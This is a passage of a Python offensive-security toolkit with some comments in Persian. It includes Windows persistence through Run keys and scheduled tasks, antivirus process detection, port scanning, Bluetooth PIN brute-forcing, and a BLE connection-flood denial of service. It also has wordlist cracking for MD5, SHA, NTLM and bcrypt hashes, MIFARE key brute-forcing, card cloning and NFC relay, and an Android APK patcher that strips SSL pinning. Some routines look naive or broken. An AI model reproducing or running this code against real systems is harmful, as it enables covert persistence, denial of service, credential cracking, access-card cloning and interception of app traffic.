                        result.append(f"{svc}: {path}")
                except:
                    pass
            return result

        @staticmethod
        def weak_acl(path: str) -> bool:
            """
            تست دسترسی نوشتن غیرقانونی روی فایل/پوشه:
            اگر کاربر فعلی می‌تواند بنویسد → ACL ضعیف است.
            """
            return os.access(path, os.W_OK)

        @staticmethod
        def schtasks_abuse(name: str, command: str) -> bool:
            """
            ایجاد Scheduled Task در فضای کاربر (بدون admin) برای افزایش دوام یا اجرا با UAC.
            """
            cmd = [
                "schtasks", "/Create",
                "/TN", name,
                "/TR", command,
                "/SC", "ONLOGON",
                "/RL", "LIMITED"
            ]
            return subprocess.run(cmd, shell=True).returncode == 0

    class WinPersistence:
        @staticmethod
        def add_run_key(name: str, command: str) -> None:
            """اضافه کردن Run Key در HKCU برای Persistence."""
            key = winreg.OpenKey(
                winreg.HKEY_CURRENT_USER,
                r"Software\Microsoft\Windows\CurrentVersion\Run",
                0, winreg.KEY_SET_VALUE
            )
            winreg.SetValueEx(key, name, 0, winreg.REG_SZ, command)
            winreg.CloseKey(key)

        @staticmethod
        def add_scheduled_task(name: str, command: str, trigger: str = "ATLOGON") -> bool:
            """
            ایجاد Scheduled Task برای اجرا در لاگین کاربر (نیاز به admin نیست).
            trigger: ATLOGON / DAILY / ONCE etc.
            """
            cmd = [
                "schtasks", "/Create",
                "/TN", name,
                "/TR", command,
                "/SC", trigger,
                "/RL", "LIMITED"
            ]
            return subprocess.run(cmd, shell=True).returncode == 0

    class WinNetwork:
        @staticmethod
        def ping(target: str, count: int = 4) -> List[str]:
            param = "-n" if sys.platform.lower().startswith("win") else "-c"
            out = subprocess.check_output(
                ["ping", param, str(count), target],
                shell=True, text=True
            )
            return out.splitlines()

        @staticmethod
        def scan_port(target: str, port: int, timeout: float = 0.5) -> bool:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(timeout)
            try:
                sock.connect((target, port))
                return True
            except:
                return False
            finally:
                sock.close()

    class WinDetectAV:
        @staticmethod
        def list_av_processes() -> List[str]:
            """شناسایی پروسس‌های آنتی‌ویروس با tasklist."""
            known = ["MsMpEng.exe", "avp.exe", "mcshield.exe", "savservice.exe"]
            out = subprocess.check_output(["tasklist"], shell=True, text=True)
            return [p for p in known if p in out]























class BluetoothHunter:
    """
    Cross-platform Bluetooth toolkit:
      - scan_le: BLE device discovery
      - brute_pair_pin: RFCOMM PIN brute-force
      - sniff_hci: HCI packet capture (Linux)
      - dos_le: BLE connection flood DoS
    """

    @staticmethod
    def scan_le(duration: int = 10) -> List[Dict[str, str]]:
        """
        BLE scan for 'duration' seconds.
        Returns list of {'address', 'name', 'rssi'}.
        """
        results: List[Dict[str, str]] = []

        async def _scan():
            devices = await BleakScanner.discover(timeout=duration)
            for d in devices:
                results.append({
                    'address': d.address,
                    'name': d.name or '',
                    'rssi': str(d.rssi)
                })

        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        loop.run_until_complete(_scan())
        loop.close()
        return results

    @staticmethod
    def brute_pair_pin(address: str, pin_list: List[str], timeout: float = 5.0) -> Optional[str]:
        """
        Parallel RFCOMM PIN brute:
        - Linux: uses bluetoothctl pairing commands
        - Windows/macOS: attempts socket.connect (may auto-pair)
        Returns working PIN or None.
        """
        def try_pin(pin: str) -> Optional[str]:
            if platform.system() == 'Linux':
                cmd = f'echo -e "pair {address} {pin}\\nquit" | bluetoothctl'
                res = subprocess.run(cmd, shell=True,
                                     stdout=subprocess.PIPE, stderr=subprocess.DEVNULL)
                if b'Successful' in res.stdout or b'Pairing successful' in res.stdout:
                    return pin
                return None
            else:
                try:
                    sock = bluetooth.BluetoothSocket(bluetooth.RFCOMM)
                    sock.settimeout(timeout)
                    sock.connect((address, 1))
                    sock.close()
                    return None
                except Exception:
                    return None

        procs = cpu_count()
        with Pool(procs) as pool:
            for result in pool.imap_unordered(try_pin, pin_list):
                if result:
                    pool.terminate()
                    return result
        return None

    @staticmethod
    def sniff_hci(interface: str = None, timeout: int = 30) -> List:
        """
        Capture HCI packets (Linux only) over 'interface' for 'timeout' seconds.
        Returns list of Scapy packets.
        """
        if sniff is None:
            raise RuntimeError("Scapy not installed; pip install scapy")
        packets = []

        def _collect(pkt):
            if BTLE in pkt:
                packets.append(pkt)

        iface = interface or conf.iface
        sniff(iface=iface, prn=_collect, timeout=timeout)
        return packets

    @staticmethod
    def dos_le(address: str, duration: int = 30, threads: int = 20):
        """
        BLE DoS: flood device by rapid connect/disconnect.
        """
        def worker():
            end = time.time() + duration
            while time.time() < end:
                try:
                    client = BleakClient(address)
                    asyncio.run(client.connect())
                    asyncio.run(client.disconnect())
                except:
                    pass

        for _ in range(threads):
            threading.Thread(target=worker, daemon=True).start()


















# External libraries for bcrypt



class Decode:
    """
    High-speed decoding and hash-cracking utilities.
    """

    @staticmethod
    def base64_decode(data: str, urlsafe: bool = True) -> bytes:
        """Decode Base64 with auto padding, URL-safe support."""
        data_str = data.strip()
        if urlsafe:
            data_str = data_str.replace('-', '+').replace('_', '/')
        padding = '=' * (-len(data_str) % 4)
        try:
            return base64.b64decode(data_str + padding)
        except Exception as e:
            raise ValueError(f"Invalid Base64 data: {e}")

    @staticmethod
    def hex_decode(data: str) -> bytes:
        """Decode hex string to bytes."""
        data_str = data.strip().replace('0x', '').replace(' ', '')
        try:
            return binascii.unhexlify(data_str)
        except Exception as e:
            raise ValueError(f"Invalid hex data: {e}")

    @staticmethod
    def url_decode(data: str, encoding: str = 'utf-8') -> str:
        """URL-decode repeatedly until stable."""
        prev = None
        cur = data
        while prev != cur:
            prev = cur
            cur = urllib.parse.unquote_plus(cur)
        return cur

    @staticmethod
    def rot13(data: str) -> str:
        """Apply ROT13."""
        return codecs.decode(data, 'rot_13')

    @staticmethod
    def js_unescape(data: str) -> str:
        """Unescape JavaScript escaping \\xHH and \\uHHHH."""
        def replace(match):
            seq = match.group(0)
            if seq.startswith('\\x'):
                return chr(int(seq[2:], 16))
            return chr(int(seq[2:], 16))
        return re.sub(r'\\x[0-9A-Fa-f]{2}|\\u[0-9A-Fa-f]{4}', replace, data)

    @staticmethod
    def strings(data: bytes, min_len: int = 4) -> List[str]:
        """Extract printable ASCII and Unicode strings."""
        pattern = f'[{re.escape(string.printable)}]{{{min_len},}}'
        return re.findall(pattern, data.decode('latin1', errors='ignore'))

    @staticmethod
    def md5_crack(hash_list: List[str], wordlist: str, procs: int = None) -> Dict[str, str]:
        """Crack MD5 hashes via wordlist with multiprocessing."""
        return Decode._hash_crack(hash_list, wordlist, 'md5', procs)

    @staticmethod
    def sha1_crack(hash_list: List[str], wordlist: str, procs: int = None) -> Dict[str, str]:
        """Crack SHA1 hashes via wordlist."""
        return Decode._hash_crack(hash_list, wordlist, 'sha1', procs)

    @staticmethod
    def sha256_crack(hash_list: List[str], wordlist: str, procs: int = None) -> Dict[str, str]:
        """Crack SHA256 hashes via wordlist."""
        return Decode._hash_crack(hash_list, wordlist, 'sha256', procs)

    @staticmethod
    def ntlm_crack(hash_list: List[str], wordlist: str, procs: int = None) -> Dict[str, str]:
        """
        Crack NTLM hashes (MD4 of UTF-16LE password).
        hash_list: list of hex NTLM hashes.
        """
        def ntlm_hash(pw: str) -> str:
            pw_bytes = pw.encode('utf-16le')
            md4 = hashlib.new('md4', pw_bytes).digest()
            return md4.hex()

        return Decode._hash_crack(hash_list, wordlist, ntlm_hash, procs, is_callable=True)

    @staticmethod
    def bcrypt_crack(hash_list: List[str], wordlist: str, procs: int = None) -> Dict[str, str]:
        """Crack bcrypt hashes via wordlist."""
        if procs is None:
            procs = max(1, cpu_count() - 1)

        def try_bcrypt(args):
            h, pw = args
            try:
                if bcrypt.checkpw(pw.encode(), h.encode()):
                    return h, pw
            except:
                pass
            return None

        with open(wordlist, 'r', errors='ignore') as f:
            words = [w.strip() for w in f if w.strip()]

        tasks = [(h, pw) for h in hash_list for pw in words]
        cracked: Dict[str, str] = {}
        with Pool(procs) as pool:
            for result in pool.imap_unordered(try_bcrypt, tasks):
                if result:
                    h, pw = result
                    cracked[h] = pw
        return cracked

    @staticmethod
    def _hash_crack(hash_list, wordlist, algo, procs=None, is_callable=False):
        """
        Generic hash crack helper.
        algo: string name for hashlib or callable(pw)->hash_hex
        """
        if procs is None:
            procs = max(1, cpu_count() - 1)

        def worker(pw: str):
            if is_callable:
                h = algo(pw)
            else:
                h = hashlib.new(algo, pw.encode()).hexdigest()
            if h in hash_set:
                return h, pw
            return None

        with open(wordlist, 'r', errors='ignore') as f:
            words = [w.strip() for w in f if w.strip()]

        hash_set = set([h.lower() for h in hash_list])
        cracked: Dict[str, str] = {}
        with Pool(procs) as pool:
            for result in pool.imap_unordered(worker, words):
                if result:
                    h, pw = result
                    cracked[h] = pw
        return cracked




















# === RFIDWizard ===
# Dependencies: pip install nfcpy pyscard


class RFIDWizard:
    """
    RFID/NFC toolkit: sniff ISO14443 tags, brute MIFARE Classic keys, clone cards, emulate, relay.
    """
    DEFAULT_KEYS = [
        bytes.fromhex(k) for k in [
            "FFFFFFFFFFFF", "A0A1A2A3A4A5", "D3F7D3F7D3F7", "000000000000",
            "B0B1B2B3B4B5", "4D3A99C351DD", "1A982C7E459A", "000000000001"
        ]
    ]

    @staticmethod
    def sniff_iso14443(timeout: int = 10) -> List[Dict[str, str]]:
        clf = nfc.ContactlessFrontend('usb')
        tags = []
        def on_connect(tag):
            info = {
                'uid': tag.identifier.hex(),
                'atqa': getattr(tag, 'ats_req', b'')[:2].hex(),
                'sak': getattr(tag, 'sak', 0)
            }
            tags.append(info)
            return True
        start = time.time()
        while time.time() - start < timeout:
            clf.connect(rdwr={'on-connect': on_connect, 'interval': 0.5})
        clf.close()
        return tags

    @staticmethod
    def brute_mifare_keys(uid: str, keyfile: Optional[str] = None, processes: int = None) -> Optional[bytes]:
        if keyfile:
            with open(keyfile, 'r') as f:
                keys = [bytes.fromhex(line.strip()) for line in f if line.strip()]
        else:
            keys = RFIDWizard.DEFAULT_KEYS
        if processes is None:
            processes = cpu_count()
        def try_key(key: bytes) -> Optional[bytes]:
            clf = nfc.ContactlessFrontend('usb')
            target = clf.sense(RemoteTarget("106A"), iterations=1)
            if not target:
                clf.close()
                return None
            tag = nfc.tag.activate(clf, target)
            for sector in range(16):
                if tag.auth(sector, key, b'\x60'):
                    clf.close()
                    return key
            clf.close()
            return None
        with Pool(processes) as p:
            for res in p.imap_unordered(try_key, keys):
                if res:
                    p.terminate()
                    return res
        return None

    @staticmethod
    def clone_mifare_classic(key: bytes, dump_file: str) -> bool:
        clf = nfc.ContactlessFrontend('usb')
        target = clf.sense(RemoteTarget("106A"), iterations=1)
        if not target:
            clf.close()
            return False
        tag = nfc.tag.activate(clf, target)
        try:
            dump = bytearray()
            for block in range(0, tag.capacity // 16):
                if not tag.auth(block // 4, key, b'\x60'):
                    return False
                dump.extend(tag.read_block(block))
            with open(dump_file, 'wb') as f:
                f.write(dump)
            return True
        finally:
            clf.close()

    @staticmethod
    def emulate_card(dump_file: str, reader_port: str = None) -> bool:
        clf = nfc.ContactlessFrontend(reader_port or 'usb')
        try:
            data = open(dump_file, 'rb').read()
            return clf.connect(llcp={'on-startup': lambda llc: True})
        except:
            return False
        finally:
            clf.close()

    @staticmethod
    def relay_nfc(reader_a: str, reader_b: str, timeout: int = 60) -> None:
        clf_a = nfc.ContactlessFrontend(reader_a)
        clf_b = nfc.ContactlessFrontend(reader_b)
        end = time.time() + timeout
        def forward(src, dst):
            while time.time() < end:
                target = src.sense(RemoteTarget("106A"), iterations=1)
                if target:
                    tag = nfc.tag.activate(src, target)
                    dst.send_cmd(tag.identifier)
        t1 = threading.Thread(target=forward, args=(clf_a, clf_b), daemon=True)
        t2 = threading.Thread(target=forward, args=(clf_b, clf_a), daemon=True)
        t1.start(); t2.start()
        t1.join(timeout); t2.join(timeout)
        clf_a.close(); clf_b.close()























class APKToolkit:
    """
    All-in-one Android APK analyzer & modifier.
    """

    @staticmethod
    def extract_manifest(apk_path: str) -> Dict[str, List[str]]:
        a = _APK(apk_path)
        return {
            "package": a.get_package(),
            "version_name": a.get_androidversion_name(),
            "permissions": a.get_permissions(),
            "activities": a.get_activities(),
            "services": a.get_services(),
            "receivers": a.get_receivers(),
            "providers": a.get_providers()
        }

    @staticmethod
    def find_hardcoded_strings(apk_path: str, min_len: int = 8) -> List[str]:
        a, dx, ux = AnalyzeAPK(apk_path)
        strs = set()
        for method in ux.get_methods():
            for s in method.get_strings():
                if len(s) >= min_len and (s.startswith("http") or ":" in s or "/" in s):
                    strs.add(s)
        return list(strs)

    @staticmethod
    def patch_ssl_pinning(apk_path: str, out_dir: str) -> None:
        subprocess.run(["apktool", "d", "-f", apk_path, "-o", out_dir], check=True)
        for root, dirs, files in os.walk(out_dir):
            for f in files:
                if f.endswith(".smali"):
                    path = os.path.join(root, f)
                    data = open(path, encoding="utf-8", errors="ignore").read()
                    if "checkServerTrusted" in data:
                        patched = data.replace("checkServerTrusted", "return-void")
                        with open(path, "w", encoding="utf-8") as w:
                            w.write(patched)
        unsigned = os.path.join(out_dir, "dist", "app-mod.apk")
        subprocess.run(["apktool", "b", out_dir, "-o", unsigned], check=True)
        signed = apk_path.replace(".apk", "-patched.apk")
        subprocess.run(["apksigner", "sign", "--ks", "keystore.jks", "--out", signed, unsigned], check=True)

    @staticmethod
    def dynamic_instrument(apk_path: str, frida_script: str) -> None:
        subprocess.run(["adb", "install", "-r", apk_path], check=True)
        pkg = _APK(apk_path).get_package()
        subprocess.run(["adb", "shell", "monkey", "-p", pkg, "-c", "android.intent.category.LAUNCHER", "1"], check=True)
        time.sleep(2)
        subprocess.run(["frida", "-U", "-f", pkg, "-l", frida_script, "--no-pause"], check=True)